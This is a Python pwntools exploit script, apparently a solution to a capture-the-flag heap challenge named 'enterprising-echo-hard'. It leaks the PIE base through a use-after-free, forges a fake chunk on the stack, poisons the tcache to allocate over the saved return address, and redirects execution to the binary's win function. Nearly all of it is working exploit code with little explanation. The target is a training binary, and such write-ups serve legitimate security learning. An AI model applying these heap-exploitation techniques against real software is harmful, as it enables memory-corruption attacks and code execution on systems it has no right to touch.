#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/enterprising-echo-hard")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def pie_base(io):
    io = malloc(io,0,0x20)
    io = free(io,0)
    io = echo(io,0,0)
    print(io.recvuntil(b"Data: ").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    base = data - next(elf.search(b"/bin/echo"))
    print(hex(base))
    return io,base 

def control_flow():
    rbp = 0x7fff12121212
    free_add = rbp - 0x90 + 0x40
    input_stack_add = rbp - 0x90
    stack_input_to_free_distance = free_add - input_stack_add
    ret = rbp + 0x8
    
    offset = ret - free_add
    io = process()
    io,base = pie_base(io)
    elf.address = base
    payload = b"a" * (stack_input_to_free_distance - 0x10) + b"\x00" * 8 + p64(0x21)
    io = stack_scanf(io,payload)
    io = stack_free(io)
    io = malloc(io,1,16)
    io = malloc(io,0,16)
    io = free(io,1)
    io = free(io,0)
    io = echo(io,0,0)
    print(io.recvuntil(b"Data: ").decode())
    address = int.from_bytes(io.recvline()[:-1],"little")
    ret_add = address + offset
    print(hex(ret_add),offset)
    io = scanf(io,0,p64(ret_add))
    io = malloc(io,2,16)
    io = malloc(io,3,16)
    payload = p64(elf.sym.win+15) # here i add 15 because scanf does not take whitespaces and win address last byte is 0x9 which is tab which does not take by scanf so i add 15 thus the program directly jump in puts of win function and scanf also take that.
    print(hex(elf.sym.win+15))
    io = scanf(io,3,payload)
    io = quit(io)
    io.interactive()


control_flow()
